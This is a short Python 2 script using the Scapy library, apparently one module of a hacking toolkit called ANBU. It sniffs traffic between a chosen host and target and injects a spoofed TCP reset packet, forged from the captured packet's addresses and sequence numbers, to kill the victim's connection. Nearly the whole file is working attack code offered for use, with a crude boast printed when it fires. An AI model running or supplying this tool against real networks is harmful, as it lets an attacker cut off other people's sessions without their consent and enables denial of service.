# ANBU :: TCP Session Hunter Module: RST Hijacking
# Author: St0rn
# 
# argv[1] = remote_host ; argv[2] = remote_port ; argv[3] = target
#
#!usr/bin/env/python
     
from scapy import *
import sys
import os
   
filtre = "host " + sys.argv[1] + " and port " + sys.argv[2]
os.system("clear")

print "\nWaiting..."
print " "
     
def rst_hijack(p):
   
 if p[IP].src==sys.argv[1] and p[IP].dst==sys.argv[3]:
    print "\n[+] Connection Found!"
    print " "
    print "[+] It's time to blow this shit!"
     
    ether = Ether(dst=p[Ether].src, src=p[Ether].dst)
    ip = IP(src=p[IP].dst, dst=p[IP].src, ihl=p[IP].ihl, flags=p[IP].flags, frag=p[IP].frag, ttl=p[IP].ttl, proto=p[IP].proto, id=29321)
    tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq, dataofs=p[TCP].dataofs,
reserved=p[TCP].reserved, flags="R", window=p[TCP].window, options=p[TCP].options)
    reset = ether/ip/tcp
    sendp(reset, verbose=0)
    print "\n\n Press ENTER to continue\n"
    raw_input()
    sys.exit()
       
sniff(count=0,prn = lambda p : rst_hijack(p),filter=filtre,lfilter=lambda(f): f.haslayer(IP) and f.haslayer(TCP))
